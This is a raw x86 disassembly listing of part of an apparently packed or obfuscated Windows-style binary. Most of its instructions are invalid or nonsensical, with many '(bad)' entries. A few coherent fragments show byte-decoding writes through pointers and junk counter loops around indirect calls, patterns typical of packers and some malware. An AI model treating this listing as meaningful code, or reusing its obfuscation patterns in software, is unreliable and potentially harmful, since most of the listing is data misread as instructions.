  4062cf:	xchg   ecx,eax
  4062d0:	neg    al
  4062d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062d3:	pop    ecx
  4062d4:	xchg   ebx,eax
  4062d5:	ins    BYTE PTR es:[edi],dx
  4062d6:	and    eax,0x74a70403
  4062db:	sub    ah,BYTE PTR [ecx-0x3d]
  4062de:	jl     0x406289
  4062e0:	call   0xb412:0x4eb2042d
  4062e7:	arpl   WORD PTR [esi-0x76],bp
  4062ea:	fisttp DWORD PTR [edi+0x4e7c927d]
  4062f0:	mov    cs,WORD PTR [ebp+0x33]
  4062f3:	ja     0x4062bd
  4062f5:	aad    0x7
  4062f7:	jnp    0x4062d1
  4062f9:	div    BYTE PTR [esi+edi*8+0x6641c1c9]
  406300:	push   0xffffffe9
  406302:	lahf   
  406303:	adc    eax,0x81c86f45
  406308:	test   eax,0xd8b8d436
  40630d:	je     0x406305
  40630f:	cmp    edi,DWORD PTR [esi-0x18]
  406312:	(bad)  
  406313:	mov    ebp,0x6d46d1f9
  406318:	or     edi,ebp
  40631a:	retf   
  40631b:	jbe    0x4062b1
  40631d:	(bad)  
  40631e:	jmp    0x4677:0x28efd927
  406325:	xchg   ebp,eax
  406326:	fcomp  QWORD PTR [edx+0xa494bb3]
  40632c:	fldcw  WORD PTR [edi]
  40632e:	or     BYTE PTR [ecx+esi*4+0x7b16f12d],dl
  406335:	repnz call 0xc4cb:0x6f92639c
  40633d:	sub    eax,0xf99e958c
  406342:	out    dx,al
  406343:	mov    edi,edx
  406345:	lea    edx,[edi]
  406347:	jg     0x406363
  406349:	mov    DWORD PTR [ecx-0x72],edi
  40634c:	sub    DWORD PTR [edx],esp
  40634e:	cmp    BYTE PTR [edx],dh
  406350:	adc    al,BYTE PTR [esi]
  406352:	test   al,0xec
  406354:	cmp    ch,0x22
  406357:	and    al,0xfc
  406359:	cmove  esp,ebp
  40635c:	mov    dl,0xe4
  40635e:	sbb    ecx,0x6ab6ae98
  406364:	in     al,0x19
  406366:	pop    ecx
  406367:	mov    cl,0x7
  406369:	cmp    al,0x7d
  40636b:	adc    eax,0x22a06cda
  406370:	mov    ds,WORD PTR [ecx+0x2f]
  406373:	push   0x6d
  406375:	cmp    eax,0x54975f4e
  40637a:	cmp    al,0xa
  40637c:	cli    
  40637d:	je     0x406384
  40637f:	test   al,bh
  406381:	and    bh,cl
  406383:	sub    DWORD PTR [di],ebp
  406386:	mov    esp,0xb63d228c
  40638b:	pop    ds
  40638c:	cwde   
  40638d:	imul   eax,DWORD PTR [edx],0x54
  406390:	mov    DWORD PTR [ecx+edi*8],ebx
  406393:	push   cs
  406394:	lods   al,BYTE PTR ds:[esi]
  406395:	dec    edx
  406396:	idiv   al
  406398:	icebp  
  406399:	inc    edi
  40639a:	ret    
  40639b:	and    eax,0x6864dae6
  4063a0:	icebp  
  4063a1:	fsub   DWORD PTR [eax]
  4063a3:	push   esp
  4063a4:	push   edx
  4063a5:	repz mov es,WORD PTR [eax-0x44]
  4063a9:	test   esi,esi
  4063ab:	sub    al,0x97
  4063ad:	cmp    BYTE PTR [ecx-0x3b],0xb3
  4063b1:	ret    
  4063b2:	cli    
  4063b3:	retf   0xe4ea
  4063b6:	(bad)  
  4063b7:	jbe    0x4063b8
  4063b9:	jne    0x4063af
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x4ae0,0xe3
  4063d1:	adc    al,0x2c
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x406414
  4063dc:	stos   DWORD PTR es:[edi],eax
  4063dd:	dec    eax
  4063de:	mov    dl,0xaa
  4063e0:	xchg   ebx,eax
  4063e1:	stc    
  4063e2:	jb     0x4063c3
  4063e4:	cmp    bl,dl
  4063e6:	pop    edi
  4063e7:	iret   
  4063e8:	fiadd  DWORD PTR [esi*1+0x165d7e18]
  4063ef:	pop    ebx
  4063f0:	or     bl,cl
  4063f2:	cdq    
  4063f3:	(bad)  
  4063f4:	cdq    
  4063f5:	test   al,0x4b
  4063f7:	pushf  
  4063f8:	inc    ecx
  4063f9:	pop    edi
  4063fa:	(bad)  
  4063fb:	outs   dx,DWORD PTR ds:[esi]
  4063fc:	js     0x406453
  4063fe:	enter  0x7094,0xbe
  406402:	fcomi  st,st(5)
  406404:	mov    ecx,0xa244465c
  406409:	and    DWORD PTR [esi],ebp
  40640b:	add    esi,edx
  40640d:	jnp    0x4063a3
  40640f:	jg     0x4063fd
  406411:	clc    
  406412:	aam    0x80
  406414:	loopne 0x406426
  406416:	and    esp,ebp
  406418:	or     al,0x97
  40641a:	test   al,0x6f
  40641c:	dec    edi
  40641d:	cmp    edi,0x27
  406420:	scas   eax,DWORD PTR es:[edi]
  406421:	inc    ebx
  406422:	iret   
  406423:	stos   DWORD PTR es:[edi],eax
  406424:	cmp    ecx,ebx
  406426:	icebp  
  406427:	inc    ebp
  406428:	cmc    
  406429:	lea    ebx,[eax]
  40642b:	push   es
  40642c:	sub    DWORD PTR [ebx-0x5c],0x7b27cc79
  406433:	or     dl,dl
  406435:	push   cs
  406436:	or     dl,BYTE PTR [esi-0x8]
  406439:	rep outs dx,BYTE PTR ds:[esi]
  40643b:	mov    al,ds:0xc7c2b742
  406440:	jno    0x4063cb
  406442:	sub    al,0x71
  406444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406445:	daa    
  406446:	and    ebx,DWORD PTR [edx]
  406448:	sub    esp,DWORD PTR ds:0xe5c2d263
  40644e:	inc    bx
  406450:	mov    eax,0xfe635260
  406455:	jmp    0x80e3:0x56554
  40645c:	add    al,0x37
  40645e:	sub    esp,DWORD PTR [edi]
  406460:	scas   eax,DWORD PTR es:[edi]
  406461:	into   
  406462:	outs   dx,BYTE PTR ds:[esi]
  406463:	xchg   esp,eax
  406464:	mov    esp,0xd33b97ba
  406469:	cdq    
  40646a:	push   ds
  40646b:	arpl   WORD PTR [eax+0x53],bx
  40646e:	arpl   WORD PTR [esi+eax*4],cx
  406471:	rol    BYTE PTR [esi+0x71dc7a4],cl
  406477:	adc    eax,0x28bf0000
  40647c:	out    dx,al
  40647d:	pop    ds
  40647e:	add    eax,0x315774f0
  406483:	dec    esp
  406484:	dec    esp
  406485:	lea    ecx,[ecx]
  406487:	sbb    bl,BYTE PTR [eax+0x39f3d50c]
  40648d:	cld    
  40648e:	ret    
  40648f:	loopne 0x4064be
  406491:	sbb    ch,BYTE PTR [esp+ecx*4+0x1b]
  406495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406496:	adc    eax,0xf777c0f8
  40649b:	sbb    BYTE PTR [ecx+ebp*1+0x72de0d87],dl
  4064a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064a3:	and    eax,0x6b0bc419
  4064a8:	add    al,0xb7
  4064aa:	jle    0x406463
  4064ac:	retf   0x1fcf
  4064af:	xchg   bl,dh
  4064b1:	iret   
  4064b2:	pop    ecx
  4064b3:	lods   eax,DWORD PTR ds:[esi]
  4064b4:	mov    al,ds:0xc070fefa
  4064b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ba:	pop    ebp
  4064bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064bc:	ret    
  4064bd:	inc    edx
  4064be:	or     ecx,DWORD PTR [eax+ebx*8]
  4064c1:	inc    esp
  4064c3:	(bad)  
  4064c5:	loop   0x406495
  4064c7:	in     eax,0x8b
  4064c9:	cli    
  4064ca:	adc    al,0xbe
  4064cc:	cmp    dl,BYTE PTR [eax+0x68]
  4064cf:	xor    ch,BYTE PTR ss:[eax+0x70801b67]
  4064d6:	adc    BYTE PTR [esi+esi*4-0x80],bl
  4064da:	fwait
  4064db:	add    eax,0xbed2dab
  4064e0:	pop    ebp
  4064e1:	dec    esi
  4064e2:	mov    ah,0x1a
  4064e4:	fisttp DWORD PTR [edx+0x24131fd0]
  4064ea:	pop    es
  4064eb:	inc    esp
  4064ec:	sbb    eax,0xcc3214c5
  4064f1:	ds pop eax
  4064f3:	pop    edi
  4064f4:	test   al,0x89
  4064f6:	add    bh,BYTE PTR [edx-0x40441ac0]
  4064fc:	retf   0x639a
  4064ff:	into   
  406500:	xchg   esi,eax
  406501:	fwait
  406502:	adc    DWORD PTR [ebp-0x1cddf91b],ecx
  406508:	iret   
  406509:	enter  0x6587,0x4a
  40650d:	(bad)  
  40650e:	and    DWORD PTR [edx],ecx
  406510:	popf   
  406511:	(bad)  
  406512:	loop   0x406587
  406514:	or     al,0xc
  406516:	mov    bh,BYTE PTR [edi]
  406518:	cmp    bl,BYTE PTR [edi+0x6f]
  40651b:	inc    esi
  40651c:	(bad)  
  40651d:	mul    BYTE PTR [esi-0x29b4b47d]
  406523:	and    DWORD PTR [esi+0x48],ebx
  406526:	ins    BYTE PTR es:[edi],dx
  406527:	adc    bh,dh
  406529:	mov    eax,ds:0x386cae20
  40652e:	mov    al,0x62
  406530:	sar    ch,0xcd
  406533:	mov    dl,0x8c
  406535:	and    al,0x43
  406537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406538:	inc    esi
  406539:	or     eax,DWORD PTR [ebx-0x321bccf5]
  40653f:	(bad)  
  406540:	cwde   
  406541:	ins    BYTE PTR es:[edi],dx
  406542:	call   0xb1c8a7a8
  406547:	dec    edi
  406548:	pop    es
  406549:	pop    esi
  40654a:	(bad)  
  40654b:	ins    DWORD PTR es:[edi],dx
  40654c:	pop    es
  40654d:	add    dl,BYTE PTR [edi]
  40654f:	test   BYTE PTR [esi-0x80],cl
  406552:	adc    BYTE PTR ds:0xb4ddc257,0x5f
  406559:	out    dx,eax
  40655a:	fiadd  WORD PTR [ecx]
  40655c:	ins    BYTE PTR es:[edi],dx
  40655d:	std    
  40655e:	cmp    BYTE PTR [edx+ebx*2+0x20],cl
  406562:	lock cmc 
  406564:	mov    ?,WORD PTR [ebx+0x13d41971]
  40656a:	or     al,0x57
  40656c:	mov    gs,WORD PTR [esi+0x72]
  40656f:	out    0x27,eax
  406571:	push   esp
  406572:	add    edi,DWORD PTR [edi+eax*2+0xe]
  406576:	fwait
  406577:	sub    BYTE PTR [edx+0x72],0xcb
  40657b:	or     eax,0x6749d933
  406580:	nop
  406581:	jne    0x40656c
  406583:	sub    esp,DWORD PTR [ebx+0x5f]
  406586:	sbb    ah,BYTE PTR fs:[eax]
  406589:	sub    al,0xd5
  40658b:	sbb    ah,cl
  40658d:	inc    ebx
  40658e:	adc    BYTE PTR [esi+0x51c4937c],bh
  406594:	cwde   
  406595:	arpl   cx,di
  406597:	mov    ch,0x46
  406599:	mov    ecx,0xc8e7d30b
  40659e:	pushf  
  40659f:	repnz sub ebx,esi
  4065a2:	sbb    ebp,eax
  4065a4:	out    0xbc,eax
  4065a6:	sub    eax,0xd8a2602d
  4065ab:	lahf   
  4065ac:	call   0xa341d8d
  4065b1:	mov    eax,0xb43d033
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1-0x725fbde]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x40659d
  40660b:	in     al,dx
  40660c:	les    ebx,FWORD PTR [ecx+0x62]
  40660f:	jbe    0x406627
  406611:	pop    ebx
  406612:	adc    al,0x1a
  406614:	test   dl,cl
  406616:	sar    BYTE PTR [esi],1
  406618:	nop
  406619:	inc    eax
  40661a:	cwde   
  40661b:	xor    BYTE PTR [edx+0x76],ch
  40661e:	sub    BYTE PTR [edx-0x1b],dh
  406621:	mov    ch,0x1
  406623:	test   DWORD PTR [edx],ebx
  406625:	sbb    eax,0xc0890788
  40662a:	pop    edx
  40662b:	cmp    eax,0xdcb2f4f7
  406630:	mov    ebp,0x45f2edba
  406635:	mov    ch,0x79
  406637:	cmp    eax,0xe69398fc
  40663c:	lahf   
  40663d:	out    0xa4,al
  40663f:	add    esp,DWORD PTR [eax]
  406641:	adc    esi,eax
  406643:	sub    al,0xbd
  406645:	push   cs
  406646:	jno    0x4066bf
  406648:	div    BYTE PTR [esi-0x51]
  40664b:	scas   eax,DWORD PTR es:[edi]
  40664c:	aad    0x67
  40664e:	inc    ecx
  40664f:	ja     0x4066c9
  406651:	sbb    BYTE PTR [ebx],al
  406653:	sahf   
  406654:	push   cs
  406655:	popa   
  406656:	test   ecx,ebp
  406658:	add    eax,0xaa9a6ba4
  40665d:	pop    ebx
  40665e:	addr16 in al,0x26
  406661:	add    ecx,DWORD PTR [esi+0x67]
  406664:	xchg   ebp,eax
  406665:	cmp    al,0xaf
  406667:	rcl    BYTE PTR [ebx-0x16],1
  40666a:	js     0x4065fc
  40666c:	clc    
  40666d:	ret    
  40666e:	in     al,0xb4
  406670:	aas    
  406671:	sbb    esi,DWORD PTR [edi-0x7]
  406674:	inc    edx
  406675:	aaa    
  406676:	sbb    al,0xc3
  406678:	inc    edx
  406679:	daa    
  40667a:	test   BYTE PTR [ebx*1-0x3d175683],al
  406681:	std    
  406682:	adc    ebx,DWORD PTR [ecx+0x51]
  406685:	push   es
  406686:	popf   
  406687:	sub    ch,BYTE PTR [eax+0x32]
  40668a:	pop    ebp
  40668b:	stc    
  40668c:	nop
  40668d:	popf   
  40668e:	ds xor esi,edi
  406691:	push   cs
  406692:	xchg   ebx,eax
  406693:	pop    ds
  406694:	jmp    0x2a7c:0xa7bcbfef
  40669b:	cmp    eax,0xe2c9ca35
  4066a0:	ror    BYTE PTR [ebx-0x6],1
  4066a3:	popf   
  4066a4:	xor    al,0x84
  4066a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066a7:	fisttp WORD PTR [edx]
  4066a9:	pop    edx
  4066aa:	std    
  4066ab:	loop   0x4066e3
  4066ad:	mov    ds:0x77d24117,al
  4066b2:	mov    WORD PTR [edx+0x20befe4c],es
  4066b8:	xor    al,0xe7
  4066ba:	add    al,0x44
  4066bc:	pop    esp
  4066bd:	jo     0x406734
  4066bf:	pop    ebx
  4066c0:	sar    DWORD PTR [edi+0x5e200d9c],1
  4066c6:	xlat   BYTE PTR ds:[ebx]
  4066c7:	ret    0x87a2
  4066ca:	imul   edx,DWORD PTR [esi-0x35],0x95468cec
  4066d1:	pop    esi
  4066d2:	dec    edx
  4066d3:	inc    esi
  4066d4:	in     al,0xa7
  4066d6:	xor    dl,al
  4066d8:	jnp    0x4066db
  4066da:	and    eax,0xd90a5316
  4066df:	ins    BYTE PTR es:[edi],dx
  4066e0:	pop    es
  4066e1:	pop    ss
  4066e2:	mov    cl,0x6b
  4066e4:	push   cs
  4066e5:	sti    
  4066e6:	push   ds
  4066e7:	mov    bl,0xe2
  4066e9:	ss ds cmp eax,0xb322e378
  4066f0:	fs out 0x47,al
  4066f3:	bound  ecx,QWORD PTR [ebx]
  4066f5:	cwde   
  4066f6:	inc    esp
  4066f8:	sub    DWORD PTR [ebx+0x3abef268],ecx
  4066fe:	mul    BYTE PTR [ecx+0x1c]
  406701:	mov    esp,0x79155cda
  406706:	fldenv [ebx-0x4]
  406709:	add    DWORD PTR [ebx-0x50],esp
  40670c:	ss addr16 push edi
  40670f:	ds gs jne 0x40676e
  406713:	test   eax,0xacde32f7
  406718:	test   eax,0x82c12b6f
  40671d:	cmp    al,0xa
  40671f:	ror    BYTE PTR [esi-0x45],1
  406722:	jbe    0x4066ca
  406724:	sar    dl,cl
  406726:	mov    dh,0x12
  406728:	xchg   edi,eax
  406729:	and    edi,DWORD PTR [ebx+0x64]
  40672c:	cli    
  40672d:	add    cl,0x79
  406730:	and    dh,BYTE PTR [ebx]
  406732:	add    DWORD PTR [ebp+0x74],0xffffffba
  406736:	xor    ebp,0x4e
  406739:	jmp    0xebe9:0x3772a6e7
  406740:	clc    
  406741:	inc    ebp
  406742:	bnd ja 0x40677b
  406745:	jp     0x40679a
  406747:	xor    BYTE PTR cs:[ebx+0x27],0x8b
  40674c:	fisttp WORD PTR [eax]
  40674e:	sbb    dh,BYTE PTR es:[ebp-0x21]
  406752:	aaa    
  406753:	add    eax,0xa56aba11
  406758:	cmp    al,0xaa
  40675a:	out    0x9f,al
  40675c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40675d:	xor    esp,DWORD PTR [edi+0x4a]
  406760:	test   al,0x5d
  406762:	sbb    dh,BYTE PTR [ebp-0x21]
  406765:	sbb    eax,0x5f29a391
  40676a:	jbe    0x4067de
  40676c:	jnp    0x406725
  40676e:	push   ebx
  40676f:	or     ebp,edi
  406771:	in     eax,0xd4
  406773:	inc    ecx
  406774:	and    bh,dh
  406776:	dec    esi
  406777:	and    BYTE PTR [esi],0x88
  40677a:	adc    eax,0x8593087d
  40677f:	jmp    0xeab0:0x7e99c506
  406786:	mov    ebp,edx
  406788:	mov    bh,0xdb
  40678a:	aam    0xa7
  40678c:	mul    DWORD PTR [edi+0x156d87d5]
  406792:	fstp   TBYTE PTR [edi]
  406794:	enter  0x82d3,0x78
  406798:	add    bh,dl
  40679a:	aaa    
  40679b:	mov    eax,0x89dc7df3
  4067a0:	fild   DWORD PTR [edi+0x2f06f951]
  4067a6:	sub    eax,0x626efe89
  4067ab:	pop    esp
  4067ac:	xor    esp,DWORD PTR [eax+eiz*1]
  4067af:	loope  0x406829
  4067b1:	ds inc edx
  4067b3:	test   DWORD PTR [esi+0x3b],esp
  4067b6:	pop    esp
  4067b7:	cmp    ch,BYTE PTR [eax-0x8612753]
  4067bd:	add    esi,ecx
  4067bf:	cs cs iret 
  4067c2:	gs add eax,0xbcf9dbb6
  4067c8:	lock loop 0x406840
  4067cb:	and    bl,BYTE PTR [edx+0x30be3e9a]
  4067d1:	push   ds
  4067d2:	push   ebp
  4067d3:	mov    cl,0x3d
  4067d5:	pop    esi
  4067d6:	mov    ch,0xa4
  4067d8:	lock test eax,0xe865687b
  4067de:	(bad)  
  4067df:	sub    eax,0x821027dd
  4067e4:	sbb    eax,0xcd8d65b8
  4067e9:	jmp    FWORD PTR [ebx]
  4067eb:	shr    DWORD PTR [ebx],0x45
  4067ee:	clc    
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x3ff2:0x546bf6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	xor    BYTE PTR [esp+esi*1],al
  406867:	push   0xffffff82
  406869:	xor    BYTE PTR [ebp-0x23f4426e],bh
  40686f:	adc    BYTE PTR [ebx+0x1bae9640],ch
  406875:	add    DWORD PTR [ebp+0x2f134876],ecx
  40687b:	inc    edi
  40687c:	rol    DWORD PTR [edi-0x59],0x38
  406880:	mov    ecx,esp
  406882:	int    0xbb
  406884:	add    dl,BYTE PTR [edi]
  406886:	add    BYTE PTR [edx+0x61e06d43],ah
  40688c:	xlat   BYTE PTR ds:[ebx]
  40688d:	inc    esp
  40688e:	outs   dx,BYTE PTR ds:[esi]
  40688f:	(bad)  
  406890:	daa    
  406891:	std    
  406892:	aam    0x43
  406894:	sub    eax,0x9d95ddbb
  406899:	fdivp  st(6),st
  40689b:	jne    0x4068e5
  40689d:	cwde   
  40689e:	out    dx,eax
  40689f:	push   eax
  4068a0:	cmc    
  4068a1:	iret   
  4068a2:	add    BYTE PTR [eax-0x6],dl
  4068a5:	adc    eax,0xa39f1b3e
  4068aa:	arpl   WORD PTR [ecx-0x73],di
  4068ad:	mov    WORD PTR [ecx],ds
  4068af:	pop    ebx
  4068b0:	mul    al
  4068b2:	fnstenv [ebp-0x14f42a3]
  4068b8:	mov    es,eax
  4068ba:	int3   
  4068bb:	pop    ds
  4068bc:	pop    ecx
  4068bd:	cld    
  4068be:	imul   ecx,edx,0x872d87f
  4068c4:	inc    edi
  4068c5:	inc    ebp
  4068c6:	jge    0x40689e
  4068c8:	mov    edi,?
  4068ca:	add    eax,0x5e08b68b
  4068cf:	push   ecx
  4068d0:	lea    ebx,[ebx]
  4068d2:	test   BYTE PTR gs:[esi+eiz*4+0x64b1684e],ch
  4068da:	mov    eax,ds:0x657fc63b
  4068df:	dec    edi
  4068e0:	mov    ds:0x946bf7f1,al
  4068e5:	pop    esp
  4068e6:	add    BYTE PTR [esp+ecx*1-0x6958e03c],dl
  4068ed:	add    eax,0x278fc935
  4068f2:	mov    ebx,0x79116018
  4068f7:	add    bl,ch
  4068f9:	mov    dl,0x6c
  4068fb:	jb     0x406978
  4068fd:	test   DWORD PTR [eax+0x285fa278],edx
  406903:	or     BYTE PTR [eax-0x21],dl
  406906:	xor    BYTE PTR [esi],bl
  406908:	mov    esp,0xb68d60da
  40690d:	xchg   ecx,eax
  40690e:	cmp    edx,esi
  406910:	sbb    al,0xde
  406912:	and    esi,DWORD PTR [esi-0x7732c4e4]
  406918:	repz ret 
  40691a:	inc    ebp
  40691b:	or     al,0xdf
  40691d:	xchg   ebx,eax
  40691e:	out    0x6c,al
  406920:	ret    0x91d6
  406923:	imul   esp,ebp,0x22c8e1fa
  406929:	mov    edx,0xd5f0f4d2
  40692e:	arpl   di,di
  406930:	adc    edi,DWORD PTR [esi-0x7c233a3e]
  406936:	mov    dl,0xdd
  406938:	sub    eax,0x5ab6e267
  40693d:	imul   ecx,DWORD PTR [eax+0x4f],0xffffff97
  406941:	(bad)  
  406942:	(bad)  
  406944:	jmp    0xccfb0be7
  406949:	test   dl,bl
  40694b:	adc    dl,BYTE PTR [ebp+0x246770f2]
  406951:	imul   edi,ebp,0x95dba7de
  406957:	add    bh,dh
  406959:	ds dec esp
  40695b:	pusha  
  40695c:	inc    eax
  40695d:	jp     0x406911
  40695f:	ins    DWORD PTR es:[di],dx
  406961:	outs   dx,BYTE PTR ds:[esi]
  406962:	int    0x4a
  406964:	aaa    
  406965:	lods   eax,DWORD PTR ds:[esi]
  406966:	jbe    0x406901
  406968:	push   cs
  406969:	pop    eax
  40696a:	push   ss
  40696b:	mov    eax,ds:0x2f0a6da8
  406970:	add    al,0xf2
  406972:	shl    BYTE PTR [eax],cl
  406974:	in     al,0xa2
  406976:	out    0x63,al
  406978:	cmp    eax,0x6049d142
  40697d:	dec    edi
  40697e:	mov    eax,0x38b0a03c
  406983:	sub    cl,dh
  406985:	mov    al,ds:0xcfd966f7
  40698a:	xor    BYTE PTR [edx-0x3],al
  40698d:	or     eax,0xae30af03
  406992:	sub    eax,0x414b0e40
  406997:	lods   al,BYTE PTR ds:[esi]
  406998:	jmp    0x5702:0x3b073617
  40699f:	or     ecx,DWORD PTR [esi+0xa3cca3b]
  4069a5:	es pop edx
  4069a7:	xor    dh,dl
  4069a9:	call   0x3cc4:0x4083c3b1
  4069b0:	or     bh,BYTE PTR [edx]
  4069b2:	in     al,dx
  4069b3:	dec    esi
  4069b4:	sub    al,0x10
  4069b6:	sub    DWORD PTR [eax],ebp
  4069b8:	sahf   
  4069b9:	test   al,0xc8
  4069bb:	sub    eax,0x6ba74dff
  4069c0:	mov    edx,0x95eb082
  4069c5:	dec    ebp
  4069c6:	mov    ah,BYTE PTR [edx+ecx*8]
  4069c9:	in     al,0xbc
  4069cb:	push   es
  4069cc:	push   esi
  4069cd:	mov    eax,ds:0x46b5cc74
  4069d2:	(bad)  
  4069d3:	stos   BYTE PTR es:[edi],al
  4069d4:	push   ds
  4069d5:	in     eax,dx
  4069d6:	aas    
  4069d7:	jbe    0x4069a2
  4069d9:	sub    al,0x94
  4069db:	xchg   DWORD PTR [edx+0x49e69c5],ecx
  4069e1:	repz xor al,0xf
  4069e4:	mov    ah,0x1a
  4069e6:	mov    dh,BYTE PTR [ecx-0xf]
  4069e9:	mov    BYTE PTR [esi+0x22],bh
  4069ec:	loop   0x406a60
  4069ee:	out    0x8f,eax
  4069f0:	xor    eax,0xb9acf1f2
  4069f5:	fmul   st,st(5)
  4069f7:	loopne 0x406a1b
  4069f9:	jo     0x4069af
  4069fb:	outs   dx,BYTE PTR ds:[esi]
  4069fc:	test   ah,dl
  4069fe:	mov    ecx,0x2016a8e8
  406a03:	fadd   st,st(6)
  406a05:	(bad)  
  406a06:	imul   ecx,DWORD PTR gs:[ebx-0x3cb2d4fe],0x1478cba
  406a11:	ror    esp,0xaa
  406a14:	imul   esp,DWORD PTR [ebp-0x4c3838c9],0xffffffa5
  406a1b:	sub    dh,cl
  406a1d:	inc    DWORD PTR [esi+0xb99921f]
  406a23:	fcomp  DWORD PTR ds:0x119d5aa5
  406a29:	fdivr  DWORD PTR [ecx]
  406a2b:	mov    ?,WORD PTR [ecx]
  406a2d:	sub    cl,BYTE PTR [ecx]
  406a2f:	mov    dh,0xe2
  406a31:	jno    0x4069fd
  406a33:	data16 std 
  406a35:	icebp  
  406a36:	addr16 shl cl,1
  406a39:	inc    eax
  406a3a:	jg     0x406aa0
  406a3c:	clc    
  406a3d:	sub    DWORD PTR [ebx+0x58],ebx
  406a40:	call   DWORD PTR [eax+0x1]
  406a43:	mov    eax,DWORD PTR [ebp-0x20]
  406a46:	mov    ecx,DWORD PTR ds:0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
